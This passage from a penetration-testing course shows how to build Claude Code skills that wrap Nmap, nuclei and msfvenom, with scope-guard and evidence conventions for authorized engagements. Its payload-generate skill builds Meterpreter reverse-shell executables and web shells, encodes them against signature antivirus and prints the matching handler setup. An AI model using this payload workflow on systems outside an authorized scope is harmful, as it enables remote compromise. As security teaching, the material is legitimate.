- `-etags network,dns` — exclude noisy template groups.
- `-c 25` — concurrency (default). Do not exceed 50 without operator OK.
- `-rate-limit 150` — global rate limit.
9.5 The merge script

scripts/merge-sources.sh:
#!/usr/bin/env bash
set -euo pipefail

ROOT="${1:?Usage: merge-sources.sh <root-domain>}"
OUT="./recon/${ROOT}/subs.txt"

# Combine subfinder, assetfinder, and any *.txt in the sources subdir
cat ./recon/${ROOT}/sources/*.txt 2>/dev/null | \
  awk '{print tolower($0)}' | \
  sort -u | \
  grep -E "\\.${ROOT}\$" > "${OUT}.tmp"

mv "${OUT}.tmp" "${OUT}"
wc -l "${OUT}"

Everything a first-pass subdomain enumeration needs is now encoded, versioned, and auto-invocable.
10. Building port-scan — Nmap with a Decision Tree

The next skill wraps Nmap. Nmap's flag surface is huge; the value the skill adds is picking the right flags for the situation without the operator having to remember.
10.1 Directory layout
~/.claude/skills/port-scan/
├── SKILL.md
└── references/
    ├── nmap-flags.md
    └── nse-safe.txt
10.2 Complete SKILL.md
---
name: port-scan
description: Run Nmap against a target host or CIDR, choosing scan type (SYN, connect, UDP) based on privilege and stealth requirements. Use when the operator asks to port-scan, service-scan, or enumerate open ports on a host or subnet. Handles nmap, port scan, service detection, TCP scan, UDP scan, SYN scan, host discovery.
tools:
  - Bash
  - Read
  - Write
---

# port-scan

## When to use
The operator names a host, an IP, or a CIDR and asks for port or service
information. This skill picks scan flags for the situation and produces both
a machine-readable and human-readable report.

## Preconditions
- `nmap` installed.
- Target confirmed in scope.
- Operator has stated whether stealth matters. If unclear, ask.
- Root privilege available for SYN scans (`sudo -n true` succeeds).

## Decision tree — scan type

If the operator says "stealth", "quiet", "avoid IDS", or "half-open":
  Use `-sS` (SYN scan). Requires root.

If the operator names UDP services (DNS, SNMP, NTP, IKE, TFTP):
  Use `-sU --top-ports 100` first. Follow with a targeted UDP scan on
  specific ports the operator names.

If root is unavailable OR the operator does not care about stealth:
  Use `-sT` (full TCP connect). No privilege required.

If the operator asks for "everything":
  Combine: `-sS -sU --top-ports 100` in one command (Nmap runs both).

Default when unsure: `-sS` on top 1000 TCP ports.

## Decision tree — port range

If the operator names specific ports: use `-p <list>`.
If the operator says "full scan" or "all ports": use `-p-` (1-65535).
If the operator says "fast" or "top": use `--top-ports 1000` (default).
Default: `--top-ports 1000`.

## Decision tree — service detection

Always include `-sV` unless the operator says "just open ports, no versions."
Include `-sC` (default scripts) when the operator wants "enum" or "recon."
Include `-O` (OS detection) only when specifically asked — it is noisy.

## Steps

1. Read `references/nmap-flags.md` for the current flag catalogue.
2. Confirm target(s) with the operator. For CIDRs larger than /24, warn about
   scan duration.
3. Pick flags using the decision trees above. State the chosen command back
   to the operator and wait for OK.
4. Create output directory:
   `mkdir -p ./scans/<target>/`
5. Run the scan with all three output formats:
   `nmap <flags> -oA ./scans/<target>/scan <target>`
   `-oA` writes `scan.nmap`, `scan.xml`, and `scan.gnmap` at once.
6. Parse the `.gnmap` for open ports and present a summary table:
   `| Host | Port | Proto | State | Service | Version |`
7. Ask the operator which service to enumerate deeper. Common next steps:
   HTTP → nikto/nuclei; SMB → enum4linux; SSH → banner grab.

## Reference files
- `references/nmap-flags.md` — full flag catalogue.
- `references/nse-safe.txt` — list of NSE scripts considered safe to run.

## Common pitfalls
- Running `-p-` on a /24 with `-T3` — hours of scan time. Warn the operator
  and offer a top-ports fallback.
- Missing `sudo` on `-sS` — Nmap silently falls back to `-sT`. Check for
  root before choosing SYN.
- Trusting `-sV` version output blindly — banners can lie. Always verify
  before pivoting to an exploit.
10.3 Referenced NSE safe-list

references/nse-safe.txt:
# Safe-category NSE scripts. Any script outside this list requires operator OK.
banner
dns-brute
ftp-anon
http-title
http-headers
http-methods
http-robots.txt
ssl-cert
ssl-enum-ciphers
smb-os-discovery
smb-security-mode
ssh-hostkey
ssh2-enum-algos

Now port-scan is a single invocation and Claude picks the right flag set without the operator having to think.
11. Building payload-generate — msfvenom with Target Selection

Payload generation is repetitive and error-prone by hand. This skill wraps msfvenom with target OS/arch selection and encoding options.
11.1 Directory layout
~/.claude/skills/payload-generate/
├── SKILL.md
├── references/
│   ├── payload-matrix.md
│   └── encoders.md
└── scripts/
    ├── gen-windows.sh
    ├── gen-linux.sh
    └── gen-web.sh
11.2 Complete SKILL.md
---
name: payload-generate
description: Generate reverse-shell or bind-shell payloads with msfvenom, choosing the right payload and encoder for the target OS, architecture, and delivery format. Use when the operator asks for a shellcode, reverse shell, bind shell, payload, or msfvenom command. Handles msfvenom, payload generation, reverse shell, bind shell, meterpreter, encoding, shikata_ga_nai, staged vs stageless.
tools:
  - Bash
  - Read
  - Write
---

# payload-generate

## When to use
The operator has a foothold plan and needs a payload binary, script, or
executable. This skill picks payload name, encoder, and output format from
target OS/arch/delivery.

## Preconditions
- `msfvenom` installed (part of Metasploit Framework).
- Operator has provided LHOST and LPORT.
- Operator has stated target OS, arch, and delivery method (exe, elf, php, war, aspx).
- Handler is either already running or will be started before delivery.

## Decision tree — payload

If target is Windows x64 and delivery is an exe:
  `windows/x64/meterpreter/reverse_tcp` (staged) OR
  `windows/x64/meterpreter_reverse_tcp` (stageless).

If target is Windows x86 and delivery is an exe:
  `windows/meterpreter/reverse_tcp`.

If target is Linux x64 and delivery is an elf:
  `linux/x64/meterpreter/reverse_tcp`.

If delivery is web (PHP, ASPX, JSP):
  `php/meterpreter/reverse_tcp`,
  `windows/x64/meterpreter/reverse_tcp` via ASPX,
  `java/jsp_shell_reverse_tcp` for JSP.

If target has strict egress and only 443 is out:
  Use `reverse_https` variants.

## Decision tree — staged vs stageless

If the target has AV/EDR and payload size is not constrained:
  Prefer stageless. Fewer network callbacks, less signature surface.

If size matters (e.g. buffer overflow shellcode):
  Prefer staged. Smaller initial payload.

Default: stageless when file-based delivery, staged when memory-based.

## Decision tree — encoding

If the target has signature-based AV and you cannot use a custom loader:
  Encode with `-e x86/shikata_ga_nai -i 6` (six iterations).

If the target is x64 Windows:
  Note that shikata_ga_nai is x86-only. Use `-e x64/xor` or move to a
  proper loader outside msfvenom.

If the target has any modern EDR:
  msfvenom encoders will not evade it. State this clearly to the operator
  and suggest a custom loader instead.

## Steps

1. Ask for: target OS, arch, delivery format, LHOST, LPORT, payload type
   (reverse_tcp/https/bind), and any evasion constraints.
2. Read `references/payload-matrix.md` to confirm payload name for the
   platform combination.
3. Pick encoder from `references/encoders.md`.
4. Run the appropriate script:
   - `scripts/gen-windows.sh <lhost> <lport> <payload> <outfile>`
   - `scripts/gen-linux.sh <lhost> <lport> <payload> <outfile>`
   - `scripts/gen-web.sh <lhost> <lport> <lang> <outfile>`
5. Show the generated file's size and a hash. Warn the operator to test
   the payload in an isolated VM against the same AV/EDR the target runs.
6. Print the matching Metasploit handler snippet:

use exploit/multi/handler set PAYLOAD set LHOST set LPORT set ExitOnSession false run -j

## Reference files
- `references/payload-matrix.md` — OS/arch/format → payload-name table.
- `references/encoders.md` — encoder capabilities and constraints.

## Common pitfalls
- Payload/handler mismatch — the handler must use the identical payload
name. Print both.
- Shikata_ga_nai as an EDR bypass — it is not. Modern EDR flags encoded
msfvenom output on sight.
- Forgetting `-b` to specify bad characters when generating exploit
shellcode — the payload will contain nulls the exploit chain rejects.
11.3 Windows generator script

scripts/gen-windows.sh:
#!/usr/bin/env bash
set -euo pipefail

LHOST="${1:?}"
LPORT="${2:?}"
PAYLOAD="${3:?}"
OUTFILE="${4:?}"

msfvenom \
  -p "${PAYLOAD}" \
  LHOST="${LHOST}" \
  LPORT="${LPORT}" \
  -f exe \
  -e x86/shikata_ga_nai -i 6 \
  -o "${OUTFILE}"

sha256sum "${OUTFILE}"
ls -lh "${OUTFILE}"
11.4 Payload matrix reference

references/payload-matrix.md:
# Payload matrix

| Target OS | Arch | Format | Recommended payload |
|-----------|------|--------|--------------------|
| Windows | x64 | exe | windows/x64/meterpreter/reverse_tcp |
| Windows | x64 | exe (stageless) | windows/x64/meterpreter_reverse_tcp |
| Windows | x86 | exe | windows/meterpreter/reverse_tcp |
| Windows | x64 | dll | windows/x64/meterpreter/reverse_tcp (fmt=dll) |
| Linux | x64 | elf | linux/x64/meterpreter/reverse_tcp |
| Linux | x86 | elf | linux/x86/meterpreter/reverse_tcp |
| macOS | x64 | macho | osx/x64/meterpreter/reverse_tcp |
| Web | php | php | php/meterpreter/reverse_tcp |
| Web | aspx | aspx | windows/x64/meterpreter/reverse_tcp (fmt=aspx) |
| Web | jsp | war/jsp | java/jsp_shell_reverse_tcp |

That is payload-generate complete — a decision-driven wrapper that produces the right payload with the right encoder and the matching handler snippet.
12. Multi-Step Skills That Call Subagents

Some pentest workflows have parts that can run in parallel — say, running nikto and gobuster against several hosts at once. Skills can spawn subagents via the Task tool for those parts.
12.1 When parallelism helps

    Independent per-host work (nikto against 20 hosts at once).
    Independent per-endpoint work (gobuster against multiple base URLs).
    Independent tool sweeps that do not share state.

Do not parallelize:

    Steps that must run in order (recon → live probe → vuln scan).
    Steps that share output files (concurrent writes corrupt them).

12.2 Skill body that spawns subagents
## Steps

1. Read the live-hosts file (`live.txt`) produced by the previous step.
2. Split hosts into groups of five.
3. For each group, spawn a subagent via the Task tool with prompt:
   "Run nikto against these hosts sequentially, save each output to
   ./scans/nikto-<host>.txt, and return a one-line summary per host."
4. Wait for all subagents to complete.
5. Collate summaries into a single report grouped by host.

The model reads step 3 and calls the Task tool with the given prompt for each group. Each subagent runs in parallel in its own context — main context stays clean.
12.3 Rules for subagent-invoking skills

    Always tell the subagent what to write and where. Vague "do recon" prompts produce inconsistent outputs.
    Always specify a return-value contract. "Return one line per host: <host> — <status> — <finding count>."
    Never let subagents write to the same file. Give each a unique output path.
    Never spawn more than ten subagents at once from a single skill. Beyond that, throughput drops and errors rise.

13. Skills That Write Persistent Files — Output Conventions

Most pentest skills produce artifacts. Standardize where those artifacts go so the whole engagement stays organized.
13.1 Recommended output tree
./engagement-root/
├── scope.md
├── recon/
│   └── <target>/
│       ├── subs.txt
│       ├── live.txt
│       └── findings.txt
├── scans/
│   └── <target>/
│       ├── scan.nmap
│       ├── scan.xml
│       └── scan.gnmap
├── payloads/
│   └── <date>/
│       ├── shell.exe
│       └── shell.exe.sha256
├── loot/
│   └── <host>/
│       ├── creds.txt
│       └── hashes.txt
└── report/
    ├── findings/
    └── screenshots/
13.2 Enforce the convention in the skill

Every skill that writes should hard-code its output location in the body:
## Steps
1. Create output directory: `mkdir -p ./recon/<root>/`
2. Write all files under `./recon/<root>/`.
3. Never write outside `./recon/`, `./scans/`, `./payloads/`, `./loot/`, or `./report/`.

That guardrail prevents Claude from scattering files across the working directory when a skill is invoked from an unfamiliar location.
13.3 Filename conventions

    Timestamps in filenames use ISO-8601: 2026-09-05T12-30-scan.xml.
    Never overwrite existing outputs — append a numeric suffix.
    Always write a companion .sha256 for binary payloads.

14. Version Control for Skills — One Skill per Branch

Skills are code. Treat them like code.
14.1 Repo layout

Store your skills in one git repo:
~/skills-repo/
├── subdomain-enum/
│   └── SKILL.md
├── port-scan/
│   ├── SKILL.md
│   └── references/
├── payload-generate/
│   ├── SKILL.md
│   └── scripts/
└── README.md

Symlink each into ~/.claude/skills/:
ln -s ~/skills-repo/subdomain-enum ~/.claude/skills/subdomain-enum
ln -s ~/skills-repo/port-scan ~/.claude/skills/port-scan

Now git status in ~/skills-repo/ tells you what has changed and every edit is versioned.
14.2 Branch per change

One skill change per feature branch:
git checkout -b subdomain-enum/add-assetfinder-fallback
# edit subdomain-enum/SKILL.md
git commit -am "subdomain-enum: fall back to assetfinder when subfinder returns 0 hits"
14.3 Testing before merge

Before merging a skill change to main, run the three tests from section 7 against the branch:

    Direct invocation: does /subdomain-enum still work?
    Trigger-phrase invocation: do all three paraphrases still fire it?
    Passive load: does it still surface in the broader planning conversation?

If yes on all three, merge. If no, refine the description or step wording.
14.4 PR review checklist

    SKILL.md frontmatter parses as YAML.
    description follows the three-part pattern (what/when/keywords).
    Steps are imperative and numbered.
    Every referenced resource file exists.
    No hard-coded absolute paths.
    No credentials, keys, or IPs from a real engagement.

15. Distributing Skills — Plugin, Repo, Marketplace

Once a skill or a set of skills is stable, share it.
15.1 As a plugin

A Claude Code plugin is a directory with a plugin.json and a skills/ subdirectory:
red-team-kit/
├── plugin.json
└── skills/
    ├── subdomain-enum/
    ├── port-scan/
    └── payload-generate/

plugin.json:
{
  "name": "red-team-kit",
  "version": "1.0.0",
  "description": "Recon and payload skills for external pentests.",
  "author": "Red Team Leaders"
}

Install locally with claude plugin install ./red-team-kit. Anyone who installs the plugin gets all three skills at once.
15.2 As a shared git repo

Publish the skills repo on GitHub with instructions:
## Install
git clone https://github.com/<org>/pentest-skills ~/skills-repo
ln -s ~/skills-repo/* ~/.claude/skills/

Team members run those two commands and every skill drops into their global scope.
15.3 As a marketplace entry

Some Claude Code deployments include a plugin marketplace. Package the skill set as a plugin (section 15.1), tag a release, and submit the release archive to the marketplace listing per the marketplace's submission rules.
15.4 What to check before publishing

    No API keys in any file (git-secrets --scan catches most).
    No client names or IPs.
    README with an example invocation per skill.
    License file — MIT is standard for internal tooling.
    Version in plugin.json matches the git tag.

16. Best Practices — Small Skills, Clear Preconditions, Explicit Outputs

Five rules that separate skills that work from skills that sit unused.
16.1 Small skills over monoliths

Do not build recon that does subdomains + ports + directories + vulns. Build four skills: subdomain-enum, port-scan, dir-fuzz, nuclei-scan. The model picks the right one for the situation; a monolithic skill misfires whenever the situation is not "do everything."
16.2 Clear preconditions

Every skill's Preconditions section lists exactly what must be true before the skill runs. Missing tools, missing scope confirmation, missing input files — call them out at the top so the model checks them at step 0.
16.3 Explicit outputs

Every skill states, in the body, what files it produces and where. That lets a downstream skill say "read ./recon/<root>/live.txt" without having to guess the format.
16.4 Named decisions

Every branching point uses a named decision tree with explicit if guards. The model executes trees deterministically; it improvises on freeform descriptions.
16.5 Version resource files with the skill

Never reference a resource file that lives outside the skill directory. When you distribute the skill, the resource file goes with it.
16.6 Anti-patterns to avoid
Anti-pattern	Why it fails
Skill that requires editing SKILL.md per run	Not reusable
Skill body with paragraphs of exposition	Model ignores steps buried in prose
Skill that shells out to interactive tools	Session hangs waiting for input
Skill that hardcodes engagement-specific paths	Breaks on the next engagement
Skill that mixes global and project scope in the same directory	Unpredictable which one loads
17. Full End-to-End — Building nuclei-scan

We finish by walking through the full authoring cycle for one more skill, nuclei-scan, including test-and-refine passes.
17.1 Requirements

    Input: a list of live URLs (from httpx or elsewhere).
    Output: a Markdown finding table by severity and host.
    Behavior: pick template set from operator hint (web-app, cloud, network).
    Constraint: never scan info severity on first pass.

17.2 First-draft SKILL.md
---
name: nuclei-scan
description: Scan a URL list with nuclei and produce a findings report.
---

# nuclei-scan

## Steps
1. Run nuclei on the URL list.
2. Save output.
3. Report findings.

That is not a skill. The frontmatter has no trigger keywords, the steps have no flags, and there is no decision-making. Test it: type "vuln-scan this list of URLs" and Claude will not fire the skill because "nuclei" is not in the request and the description does not link to "vuln-scan."
17.3 Second draft — description expanded
---
name: nuclei-scan
description: Scan a list of live URLs with nuclei to find CVEs and misconfigurations, choosing template categories based on target type (web-app, cloud, network). Use when the operator has a URL list and asks for a vuln scan, cve check, template scan, or first-pass vulnerability sweep. Handles nuclei, template scan, vuln scan, cve, misconfiguration, exposure check.
---

Now the three phrasings fire it:

    "Vuln-scan this list" — matches "vuln scan."
    "Check these URLs for CVEs" — matches "cve check."
    "Run nuclei against live.txt" — matches "nuclei."

17.4 Third draft — body with a decision tree
# nuclei-scan

## When to use
The operator has a URL list (usually from httpx) and wants a first-pass
vulnerability sweep. Picks template categories from operator hint.

## Preconditions
- `nuclei` installed and templates updated (`nuclei -update-templates`).
- URL list exists and contains live URLs, not raw hostnames.
- Operator has confirmed rate-limit expectations.

## Decision tree — template selection

If the operator says "web-app" or "web application":
  `-t http/ -t exposures/ -t misconfiguration/`

If the operator says "cloud" or names a cloud provider:
  `-t cloud/ -t exposures/tokens/ -t misconfiguration/`

If the operator says "network" or "infra":
  `-t network/ -t default-logins/`

If the operator says "everything" or is unsure:
  omit `-t` (use all templates). Warn about scan duration.

Default when unsure: `-t http/ -t exposures/ -t misconfiguration/`.

## Decision tree — severity

Never scan `info,low` on a first pass. Start with `medium,high,critical`.

If a specific `high` or `critical` finding needs corroboration, rerun with
`-severity low` scoped to the affected host only.

## Steps

1. Confirm URL list path and target category with the operator.
2. Update templates if last update was more than 7 days ago:
   `nuclei -update-templates`
3. Build the command using the decision trees.
4. Run:
   `nuclei -l <urls> -severity medium,high,critical <template-flags> -rate-limit 150 -c 25 -o ./scans/nuclei-<date>.txt -jsonl -json-export ./scans/nuclei-<date>.jsonl`
5. Parse the JSONL output and build a Markdown table:
   `| Severity | Template | Host | Matched-at |`
6. Group by severity, then by host. Present to operator.
7. Suggest next steps per top finding.

## Common pitfalls
- Running `-severity info` on first pass — thousands of noise findings.
- Running against staging templates on prod — check `-t` paths carefully.
- Not updating templates — missing recent CVEs. Update weekly at minimum.
17.5 Lab test

Set up a lab:
mkdir -p ~/lab/nuclei-test
cd ~/lab/nuclei-test
echo "http://scanme.nmap.org" > urls.txt
echo "https://scanme.nmap.org" >> urls.txt

Launch Claude Code in that directory:
> vuln-scan urls.txt as a web-app target

Verify:

    nuclei-scan skill auto-fires (check verbose logs).
    The decision tree picks the web-app template branch.
    The final command written is what the skill body describes.
    The Markdown finding table is generated and grouped correctly.

17.6 Refine trigger phrasing

Try three more phrasings and note which fire the skill:

    "Look for CVEs in urls.txt" — fires (matches "cve check").
    "Do a template scan of these URLs" — fires (matches "template scan").
    "Sweep urls.txt for exposures" — does not fire — "sweep" and "exposures" not in the description.

Add the missing vocabulary:
description: ... Handles nuclei, template scan, vuln scan, cve, misconfiguration, exposure check, exposure sweep, first-pass vulnerability sweep.

Retest — now the third phrasing fires. Commit the refinement.
17.7 Version and ship
cd ~/skills-repo
git checkout -b nuclei-scan/initial
git add nuclei-scan/
git commit -m "nuclei-scan: initial skill with template category decision tree"
git push origin nuclei-scan/initial

Open a PR against main, review it against the checklist in section 14.4, merge.
18. Exercises
18.1 Guided

Exercise G1 — Add an ALB-check step to subdomain-enum

Extend subdomain-enum/SKILL.md so that after httpx, it also runs a check for AWS ALB-owned hostnames (a dig +short CNAME for each live host, filtering for elb.amazonaws.com). Save results to ./recon/<root>/alb.txt. Test that the change does not break the existing three-stage flow.

Exercise G2 — Add a -p- guard to port-scan

Modify the port-range decision tree so that when the operator says "full scan" or -p-, the skill first checks target size. If the target is a CIDR wider than /28, warn the operator that full-port scan across that many hosts will take hours and offer --top-ports 1000 as an alternative. Verify the guard fires by asking Claude to run a full scan against 10.0.0.0/24.

Exercise G3 — Add an EDR-warning branch to payload-generate

Add a new decision-tree branch: if the operator says "EDR", "AV bypass", or "evasion," the skill must refuse to generate a stock msfvenom payload and instead explain that shikata_ga_nai does not evade modern EDR. It should suggest a custom loader path. Test that asking for an "EDR-bypass payload" triggers the refusal.
18.2 Independent

Exercise I1 — Author a smb-enum skill

Build a full SKILL.md that enumerates SMB hosts using smbclient, enum4linux-ng, and rpcclient. Include a decision tree for null-session vs authenticated vs Kerberos. Version-control the skill in a branch and open a self-review PR.

Exercise I2 — Author a jwt-triage skill

Build a SKILL.md that decodes a JWT (base64url decode of the three segments), extracts algorithm and claims, checks for alg=none, weak signing keys via jwt_tool, and produces a finding when any check fires. Include one script resource that wraps jwt_tool and one reference file with the CVE list for known JWT library flaws.

Exercise I3 — Package the four skills as a plugin

Take subdomain-enum, port-scan, payload-generate, and nuclei-scan, wrap them as a plugin (plugin.json + skills/), install locally with claude plugin install, and verify that all four fire correctly on their trigger phrases from a fresh project directory that does not have them at global scope.
19. Summary and Next-Lesson Pointer

A skill in Claude Code is a Markdown playbook — a SKILL.md with YAML frontmatter and imperative steps — plus optional resource files in the same directory. The frontmatter's description field is the trigger pattern; write it as what/when/keywords and Claude will auto-invoke the skill when the situation matches. The body is imperative, numbered, and uses named decision trees for branching. Resource files load on demand so the top-level SKILL.md stays short and readable.

Skills live at three scopes — project, user-global, plugin — with project winning ties. Test every skill three ways: direct invocation, trigger-phrase invocation, and passive load. Version-control skills the same way you version tools: one repo, one branch per change, PR review against a checklist. Distribute as a plugin, a shared repo, or a marketplace entry.

For pentest work, the highest-value skills wrap the workflows you run every engagement: subdomain-enum, port-scan, payload-generate, nuclei-scan, smb-enum, jwt-triage. Keep each one small, single-purpose, and honest about its preconditions and outputs. Do not build monoliths.

In the next lesson — Lesson 03: Creating Custom Pentest Prompts for Codex — we shift from Claude Code skills to Codex prompt engineering. Codex has a different invocation model and a different prompt structure, but the same underlying principle: encode the workflow so the model executes it consistently. We will build a matched set of Codex prompts for the same recon, exploitation, and payload tasks we just covered, and compare when to reach for Codex versus Claude Code on a live engagement.





















Lesson 04 — Building Exploitation and Validation Skills

    Module 06: Building Pentest Skills with Claude and Codex · Penetration Testing with Kali Linux 1.0 · Red Team Leaders

1. Introduction

Exploitation is loud, dramatic, and — in a real engagement — a very small fraction of your time. What actually consumes an assessment is the slow, careful work between "the scanner said something might be here" and "the client trusts this finding enough to spend money on it." That slow work is validation.

A good scanner emits hundreds of raw findings per host. A good report contains fewer than a dozen. The gap between those two numbers is closed by validation: the human, methodical process of asking "is this real, is it reachable, does it hold up when I press on it, is this the customer's asset at all." Every hour you save on validation is an hour you can spend on business-logic bugs, chained attack paths, or writing a report that engineering will actually read.

This lesson builds eight Claude Code and Codex skills that turn validation into a repeatable, evidence-generating pipeline. Every skill is designed for authorized lab work first — the same lab targets you built in Modules 3 through 5 — and for engagements where you already hold a signed scope agreement. The skills refuse to run against anything outside a ./engagement/scope.yml file and write reproducible evidence to ./findings/<id>/, so both you and the blue team you eventually hand the report to can retrace every step.

By the end of this lesson you will have:

    A nuclei-run skill that turns a scan into a Markdown triage list
    A cve-validate skill that consults public advisories, not zero-day mirrors
    A sqli-detect skill wrapping sqlmap with scope guardrails
    An xss-check skill wrapping dalfox with a controlled payload set
    A poc-scaffold skill that produces a template PoC, never a working exploit
    A web-fuzz-directories skill wrapping ffuf with tuned wordlists
    A session-token-analyze skill for JWT and cookie triage
    A finding-reproduce skill that replays a finding YAML deterministically
    A shared scope-guard and evidence convention that ties them together
    One worked end-to-end chain that walks a nuclei hit all the way to a validated finding directory

Every example command in this lesson assumes the reader is testing systems they own or systems that are explicitly named in a signed engagement scope. Point these skills at anything else and you are outside the frame this lesson operates in.
2. Ethical Scope and Legal Framing

Before any skill runs, three questions must have a yes:

    Do I have written authorization for this target?
    Is the specific IP, hostname, port, or URL in scope?
    Is the specific test technique in the "allowed" list of the engagement rules of engagement (RoE)?

This lesson treats those questions as engineering constraints, not a compliance afterthought. Every skill enforces them through a scope.yml file that lives beside the skill invocation.
2.1 What the Skills in This Lesson Are — and Are Not

These skills:

    Wrap open-source tooling with structured inputs and outputs
    Enforce a scope check before any network activity
    Emit reproducible evidence to a per-finding directory
    Reference public advisories (NVD, MITRE, vendor bulletins)

These skills do not:

    Generate working exploit code for arbitrary CVEs
    Bypass authentication, WAFs, or rate limits by design
    Run destructive test flags in default mode
    Modify server state without a documented, approved step

If you find yourself editing a skill to remove a scope check, stop. That is a red flag that the assessment has drifted outside its charter, and the correct response is to stop testing and escalate to the engagement owner.
2.2 The Engagement Directory Layout

Every skill in this lesson expects the same working-directory layout:
engagement/
  scope.yml             # in-scope targets and disallowed techniques
  roe.md                # rules of engagement, signed by the client
  contacts.md           # emergency contacts, escalation phone tree
findings/
  <id>/
    finding.yml         # structured finding record
    evidence/           # raw tool output, pcaps, screenshots
    reproduce.sh        # replay script
    report.md           # human-readable narrative
poc/
  <cve>/                # scaffolded PoC placeholders (see Skill 5)
logs/
  <skill>-YYYYMMDD.log  # append-only run log
skills/
  <skill-name>/SKILL.md # skill definition consumed by Claude Code

Create it once per engagement:
mkdir -p engagement findings poc logs skills
touch engagement/scope.yml engagement/roe.md engagement/contacts.md
3. Skill 1 — nuclei-run

nuclei is a template-driven scanner from ProjectDiscovery that runs YAML-defined checks against HTTP, DNS, and TCP services. It is a first-pass tool: fast, wide, and prone to false positives. The skill wraps it with a scope gate, forces JSONL output, and produces a Markdown triage list you (or Claude) can walk through by hand.
3.1 SKILL.md
---
name: nuclei-run
description: Run nuclei with community templates at high or critical severity against in-scope targets. Emit JSONL and a Markdown triage list.
inputs:
  - name: target_file
    description: Path to a newline-delimited list of URLs. Every entry must appear in ./engagement/scope.yml.
    required: true
  - name: severity
    description: Comma-separated severity filter. Defaults to "high,critical".
    required: false
  - name: templates
    description: Template selection. Defaults to community templates directory.
    required: false
allowed-tools:
  - Bash
  - Read
  - Write
---

# nuclei-run

## When to use

Use at the start of a web application engagement, after you have a confirmed list of in-scope hosts and you want a first pass at known CVE checks, misconfigurations, and default-credential probes.

## Preconditions

- `./engagement/scope.yml` exists and lists every target host or wildcard.
- `nuclei` is installed and the community templates are updated (`nuclei -update-templates`).
- The engagement RoE permits active scanning of the target windows.

## Behavior

1. Read `./engagement/scope.yml`.
2. For each URL in `target_file`, check that its hostname or IP matches an entry in scope. Refuse and exit non-zero on a mismatch.
3. Create `./findings/nuclei-<UTC timestamp>/` and log every target hit to `./logs/nuclei-<date>.log`.
4. Run:

   ```bash
   nuclei \
     -list "$TARGET_FILE" \
     -t community-templates \
     -severity "${SEVERITY:-high,critical}" \
     -rate-limit 50 \
     -timeout 10 \
     -jsonl -o "./findings/nuclei-$TS/raw.jsonl" \
     -stats -silent

    Post-process raw.jsonl into summary.md grouping by template ID:
        Template ID, severity, matched URL, reference URLs.
        One line per unique (template, host) pair.
    Print the summary file path.

Safety rails

    Never enable -headless, -code, or -interactsh-server without an explicit user prompt.
    Rate-limit defaults to 50 requests per second; raise only with user confirmation.
    Never re-run against the same target within 30 minutes without confirmation.

Output

    ./findings/nuclei-<ts>/raw.jsonl — full nuclei output.
    ./findings/nuclei-<ts>/summary.md — Markdown triage list.
    ./logs/nuclei-<date>.log — append-only target log.

Example
nuclei-run target_file=./targets.txt severity=high,critical
References

    ProjectDiscovery nuclei docs: https://docs.projectdiscovery.io/tools/nuclei/overview


### 3.2 The Summary Format

The Markdown summary is designed to be walked by a human or by a follow-on skill. Each entry looks like:

```markdown
### CVE-2021-44228 — Apache Log4j RCE
- Severity: critical
- Matched: https://lab-01.internal.lab/api/login
- Template: cves/2021/CVE-2021-44228.yaml
- References:
  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  - https://logging.apache.org/log4j/2.x/security.html
- Next skill: cve-validate id=CVE-2021-44228 target=https://lab-01.internal.lab

The "Next skill" line is a hint the operator can copy-paste into Claude Code to continue the chain.
4. Skill 2 — cve-validate

Scanners guess. This skill checks. Given a CVE identifier and a target, it looks up the advisory, fingerprints the target's advertised version, and produces a validation methodology — the checks a human tester runs to prove reachability without necessarily firing an exploit. It never ships exploit code.
4.1 SKILL.md
---
name: cve-validate
description: Validate whether a target is plausibly vulnerable to a specific CVE by fingerprinting version headers and referencing public advisories. Does not run exploits.
inputs:
  - name: cve_id
    description: A CVE identifier, e.g. CVE-2021-44228.
    required: true
  - name: target
    description: URL or host:port. Must be in ./engagement/scope.yml.
    required: true
allowed-tools:
  - Bash
  - Read
  - Write
  - WebFetch
---

# cve-validate

## When to use

Use after a scanner (nuclei, nmap NSE, a vendor bulletin ingest) flags a CVE against a host and you need a defensible yes-or-no on whether the version and configuration are actually vulnerable before you spend budget on exploitation.

## Preconditions

- `./engagement/scope.yml` includes the target.
- `curl`, `jq` are installed.
- Internet access to `nvd.nist.gov` and vendor advisory sites (or an offline advisory cache).

## Behavior

1. Scope check `target` against `./engagement/scope.yml`. Refuse on mismatch.
2. Log the CVE and target to `./logs/cve-validate-<date>.log`.
3. Fetch the NVD JSON for the CVE:

   ```bash
   curl -sSL "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=$CVE_ID" \
     -o "./findings/$CVE_ID/nvd.json"

    Extract:
        descriptions[0].value
        metrics.cvssMetricV31[0].cvssData.baseScore
        configurations[].nodes[].cpeMatch[].criteria
        references[].url
    Fingerprint the target:
        Server, X-Powered-By, X-Generator headers
        Favicon hash (curl -sSL ${TARGET}/favicon.ico | md5sum)
        Product-specific paths (e.g. /wp-json/, /manager/html, /actuator/env)
    Compare the fingerprinted version against the CPE match ranges. Emit a verdict:
        plausible — version in vulnerable range and product matches
        unlikely — version outside range or product mismatch
        unknown — no version disclosed
    Write a validation methodology to ./findings/$CVE_ID/methodology.md with:
        Non-destructive probes (a health-check request, a version-only request)
        What a positive response looks like
        What blue-team log entries the probe should generate
        Public references (NVD, MITRE, vendor bulletin)

Safety rails

    Never fetch exploit code from third-party mirrors (exploit-db, github raw gists linked from public tweets).
    Never emit a working payload in methodology.md; only describe the class of request.
    If the verdict is plausible, prompt the user before proceeding to any follow-on skill.

Output

    ./findings/<cve>/nvd.json
    ./findings/<cve>/fingerprint.txt
    ./findings/<cve>/methodology.md

Example
cve-validate cve_id=CVE-2021-44228 target=https://lab-01.internal.lab
References

    NVD API: https://nvd.nist.gov/developers/vulnerabilities
    MITRE CVE: https://cve.mitre.org/


### 4.2 Why No Exploit Code

There are three reasons this skill is a validator, not an exploiter:

1. **Scope integrity.** A public exploit run at the wrong time hits a production system that was not in the window.
2. **Attribution.** Exploit code from a mirror may carry callbacks, hardcoded C2, or telemetry that turns your assessment into somebody else's incident.
3. **Report defensibility.** "The version is in the vulnerable range, the product string matched, and a non-destructive probe returned the vulnerable behavior" is the language a client's engineering team will accept. "I ran a random Metasploit module I did not read" is not.

---

## 5. Skill 3 — `sqli-detect`

`sqlmap` is the standard SQL injection scanner. It is also a blunt instrument: without care it will happily hammer a production database, exfiltrate rows, or trigger every WAF alert on the network. The skill wraps it with a strict scope gate, moderate level and risk defaults, and a small allowlist of destructive flags that must be explicitly opted into.
